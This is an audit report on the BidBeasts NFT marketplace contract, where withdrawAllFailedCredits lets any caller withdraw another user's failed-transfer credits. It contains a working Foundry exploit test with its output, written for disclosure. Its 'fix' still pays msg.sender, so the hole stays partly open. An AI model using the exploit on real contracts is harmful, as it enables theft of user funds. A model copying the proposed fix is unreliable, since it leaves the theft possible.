# Vulnerability Report #1

## Users Can Steal Failed Credits from Any Other User

## Description

The contract intends to hold funds for users in case of direct transfer failure (`_payout`) by storing them in a `mapping` called `failedTransferCredits`. There is a function `withdrawAllFailedCredits(address _receiver)` to allow users to withdraw these funds later.

> The problem is that the function reads the balance of the victim (`_receiver`), but incorrectly clears the balance of the caller (`msg.sender`, the attacker). As a result, an attacker can call the function with a victim's address who has a pending balance, and the contract will transfer the victim's balance to the attacker (`msg.sender`) without updating the victim's balance, allowing the attacker to call the function repeatedly to steal the same balance over and over until the contract runs out of gas.

```solidity
// src/BidBeastsNFTMarketPlace.sol

function withdrawAllFailedCredits(address _receiver) external {
    uint256 amount = failedTransferCredits[_receiver];
    require(amount > 0, "No credits to withdraw");
    
@>  failedTransferCredits[msg.sender] = 0;
    
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Withdraw failed");
}
```

## Risk Assessment

**Likelihood**: High

* This vulnerability occurs every time the function is called with a victim's address who has a pending balance.

**Impact**: Critical

* Direct theft of user funds that were held in the contract due to previous transfer failures. An attacker can drain all pending balances of all users.

## Proof of Concept (PoC)

The following test will simulate a scenario where transferring funds to the seller fails, resulting in creating a pending balance for them. Then, the attacker (BIDDER_2) will call `withdrawAllFailedCredits` using the seller's address (`SELLER`) as `_receiver` to steal their funds.

```solidity
// test/VulnerabilityTest.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {BidBeastsNFTMarket} from "../src/BidBeastsNFTMarketPlace.sol";
import {BidBeasts} from "../src/BidBeasts_NFT_ERC721.sol";
import {ERC721Holder} from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

// A mock contract that can receive NFTs but rejects Ether payments.
contract RejectEther is ERC721Holder {
    receive() external payable {
        revert("Ether payment rejected");
    }
}

contract ExploitTest is Test {
    // --- State Variables ---
    BidBeastsNFTMarket market;
    BidBeasts nft;
    RejectEther rejector;

    // --- Users ---
    address public constant OWNER = address(0x1);
    address public constant SELLER = address(0x2); // Not used directly in this test
    address public constant BIDDER_1 = address(0x3);
    address public constant BIDDER_2 = address(0x4); // Attacker

    // --- Constants ---
    uint256 public constant STARTING_BALANCE = 100 ether;
    uint256 public constant TOKEN_ID = 0;
    uint256 public constant MIN_PRICE = 1 ether;

    function setUp() public {
        // Deploy contracts
        vm.prank(OWNER);
        nft = new BidBeasts();
        market = new BidBeastsNFTMarket(address(nft));
        rejector = new RejectEther();
        vm.stopPrank();

        // Fund users
        vm.deal(BIDDER_1, STARTING_BALANCE);
        vm.deal(BIDDER_2, STARTING_BALANCE);
    }

    /// @notice This test demonstrates that an attacker can steal failed withdrawal credits from any other user.
    /// The vulnerability lies in `withdrawAllFailedCredits` which clears `msg.sender`'s credits instead of the `_receiver`'s.
    function test_exploit_StealFailedCredits_Realistic() public {
        console.log("--- Test: Steal Failed Credits ---");

        // Step 1: Mint NFT directly to the 'rejector' contract.
        // This simulates a scenario where the seller is a contract that cannot receive ETH.
        console.log("Step 1: Minting NFT to victim contract (rejector)...");
        vm.prank(OWNER);
        nft.mint(address(rejector));
        vm.stopPrank();
        assertEq(nft.ownerOf(TOKEN_ID), address(rejector), "Rejector should own the NFT");
        console.log("NFT minted successfully to victim.");

        // Step 2: The 'rejector' contract lists the NFT for sale.
        // We use vm.prank to act on its behalf.
        console.log("Step 2: Victim contract lists the NFT...");
        vm.startPrank(address(rejector));
        nft.approve(address(market), TOKEN_ID);
        market.listNFT(TOKEN_ID, MIN_PRICE, 0);
        vm.stopPrank();
        assertEq(market.getListing(TOKEN_ID).seller, address(rejector), "Listing seller should be the victim contract");
        console.log("NFT listed successfully.");

        // Step 3: A bidder places a valid bid.
        uint256 bidAmount = MIN_PRICE + 1 ether;
        console.log("Step 3: Bidder places a bid of %s ETH...", bidAmount / 1 ether);
        vm.prank(BIDDER_1);
        market.placeBid{value: bidAmount}(TOKEN_ID);
        vm.stopPrank();
        console.log("Bid placed successfully.");

        // Step 4: Settle the auction after it ends.
        // The payout to 'rejector' will fail due to its receive() function, creating a failed credit.
        console.log("Step 4: Settling auction, expecting payout to fail...");
        vm.warp(block.timestamp + market.S_AUCTION_EXTENSION_DURATION() + 1);
        market.settleAuction(TOKEN_ID);
        console.log("Auction settled.");

        // Step 5: Verify that a failed credit was created for the victim.
        uint256 expectedCredit = (bidAmount * (100 - market.S_FEE_PERCENTAGE())) / 100;
        uint256 victimCredit = market.failedTransferCredits(address(rejector));
        console.log("Victim's expected failed credit: %s wei", expectedCredit);
        console.log("Victim's actual failed credit:   %s wei", victimCredit);
        assertEq(victimCredit, expectedCredit, "Victim should have failed credits after failed payout");
        console.log("Step 5: Verified failed credit created for victim.");

        // --- THE ATTACK ---
        console.log("\n--- Starting Attack ---");

        // Step 6: Attacker (BIDDER_2) calls `withdrawAllFailedCredits` with the victim's address.
        address attacker = BIDDER_2;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Attacker balance before attack: %s ETH", attackerBalanceBefore / 1 ether);

        vm.prank(attacker);
        market.withdrawAllFailedCredits(address(rejector));
        console.log("Step 6: Attacker called withdrawAllFailedCredits(victim_address).");

        // Step 7: Assert that the theft was successful and the state is incorrect.
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Attacker balance after attack:  %s ETH", attackerBalanceAfter / 1 ether);
        assertEq(attackerBalanceAfter, attackerBalanceBefore + expectedCredit, "Attacker's balance should have increased by the victim's credit amount");
        console.log(" VULNERABILITY CONFIRMED: Attacker's balance increased correctly.");

        // Verify the bug: victim's credits were not cleared.
        uint256 victimCreditAfter = market.failedTransferCredits(address(rejector));
        console.log("Victim's failed credits after attack: %s wei", victimCreditAfter);
        assertEq(victimCreditAfter, expectedCredit, "Victim's credit should NOT have been cleared!");
        console.log(" VULNERABILITY CONFIRMED: Victim's credits remain, allowing for re-entrancy/re-exploitation.");
        
        // Verify the bug: attacker's own (zero) credits were cleared instead.
        uint256 attackerCreditAfter = market.failedTransferCredits(attacker);
        assertEq(attackerCreditAfter, 0, "Attacker's own credits (which were 0) should now be 0");
        console.log(" VULNERABILITY CONFIRMED: Attacker's (empty) credit balance was cleared instead of victim's.");
    }
}
```

**To run the test:**

1. Add the above test to the file `test/VulnerabilityTest.t.sol`.
2. Run the following command: `forge test --match-path test/VulnerabilityTest.t.sol -vv`

**Expected Result:**

```bash
➜  2025-09-bid-beasts git:(main) ✗ forge test --match-path test/VulnerabilityTest.t.sol -vv   
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/VulnerabilityTest.t.sol:ExploitTest
[PASS] test_exploit_StealFailedCredits_Realistic() (gas: 362808)
Logs:
  --- Test: Steal Failed Credits ---
  Step 1: Minting NFT to victim contract (rejector)...
  NFT minted successfully to victim.
  Step 2: Victim contract lists the NFT...
  NFT listed successfully.
  Step 3: Bidder places a bid of 2 ETH...
  Bid placed successfully.
  Step 4: Settling auction, expecting payout to fail...
  Auction settled.
  Victim's expected failed credit: 1900000000000000000 wei
  Victim's actual failed credit:   1900000000000000000 wei
  Step 5: Verified failed credit created for victim.
  
--- Starting Attack ---
  Attacker balance before attack: 100 ETH
  Step 6: Attacker called withdrawAllFailedCredits(victim_address).
  Attacker balance after attack:  101 ETH
   VULNERABILITY CONFIRMED: Attacker's balance increased correctly.
  Victim's failed credits after attack: 1900000000000000000 wei
   VULNERABILITY CONFIRMED: Victim's credits remain, allowing for re-entrancy/re-exploitation.
   VULNERABILITY CONFIRMED: Attacker's (empty) credit balance was cleared instead of victim's.

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.30ms (1.47ms CPU time)
```

## Recommended Fix

The function should be updated to clear the balance of `_receiver` instead of `msg.sender`.

```diff
// src/BidBeastsNFTMarketPlace.sol

function withdrawAllFailedCredits(address _receiver) external {
    uint256 amount = failedTransferCredits[_receiver];
    require(amount > 0, "No credits to withdraw");
    
-   failedTransferCredits[msg.sender] = 0;
+   failedTransferCredits[_receiver] = 0;
    
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Withdraw failed");
}
```
